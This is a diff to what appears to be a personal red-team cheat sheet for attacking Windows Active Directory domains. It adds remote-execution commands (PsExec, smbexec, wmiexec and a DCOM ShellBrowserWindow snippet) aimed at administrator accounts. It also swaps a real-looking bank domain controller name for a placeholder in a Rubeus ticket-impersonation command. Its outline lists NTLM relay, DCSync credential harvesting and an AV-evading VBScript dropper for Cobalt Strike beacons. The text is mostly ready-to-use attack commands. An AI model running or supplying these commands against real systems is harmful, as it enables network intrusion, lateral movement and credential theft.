@@ -46,10 +46,12 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [NTLM Relay](#ntlm-relay)
 	* [Credential Harvesing](#credential-harvesting)
 		* [DCSync](#dcsync)
-* **[Remote Authentication Between Computers](#remote-authentication-protocol)**
+* **[Remote Access](#remote-authentication-protocol)**
 	* [PSRemoting](#ps-remoting)
 	* [Winrs](#winrs)
 	* [PsExec](#psexec)
+	* [WMI](#wmi)
+	* [DCOM](#dcom)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
@@ -462,11 +464,36 @@ Winrs requires a plain-text password in order to authenticate to other computers
 winrs -u:dc01.contoso.local -u:contoso\administrator -p:P@$$w0rd! "hostname"
 ```
 
-### PsExec
+### SMB 
+**PsExec**
 This requires you to download MS Signed Binary (`PsExec.exe`) in PsTools bundle. It can be downloaded [here](https://download.sysinternals.com/files/PSTools.zip).
 ```
+# windows
 PsExec.exe -accepteula \\dc01.contoso.local powershell
+
+# linux
+psexec.py legitcorp.local/Administrator@192.168.0.110
 ```
+**SMBExec**
+```
+smbexec.py legitcorp.local/Administrator@192.168.0.110
+```
+
+### WMI
+```
+wmiexec.py legitcorp.local/Administrator@192.168.0.110
+```
+
+### DCOM
+ShellBrowserWindow object can be leverage for remote code execution over DCOM. Please note that this requires authentication (e.g. runas netonly)
+```
+PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.112.200")
+PS> $obj = [System.Activator]::CreateInstance($com)
+PS> $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
+```
+
+### Reference
+* https://dolosgroup.io/blog/remote-access-cheat-sheet
 
 ## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
@@ -607,7 +634,7 @@ Set-MachineAccountAttribute -MachineAccount "FakeComputer" -Value "FakeComputer"
 
 6. Request TGS on behalf of the domain controller ticket we obtained previously.
 ```
-Rubeus.exe s4u /impersonateuser:SGPWVADS01NTTDC$ /nowrap /dc:SGPWVADS01NTTDC.mbb.com.sg /self /altservice:ldap/SGPWVADS01NTTDC.mbb.com.sg /ptt /ticket:<base64-blob-ticket>
+Rubeus.exe s4u /impersonateuser:DC01$ /nowrap /dc:DC01.legitcorp.local /self /altservice:ldap/DC01.legitcorp.local /ptt /ticket:<base64-blob-ticket>
 ```
 
 7. Perform cleanup (OPSEC Friendly)
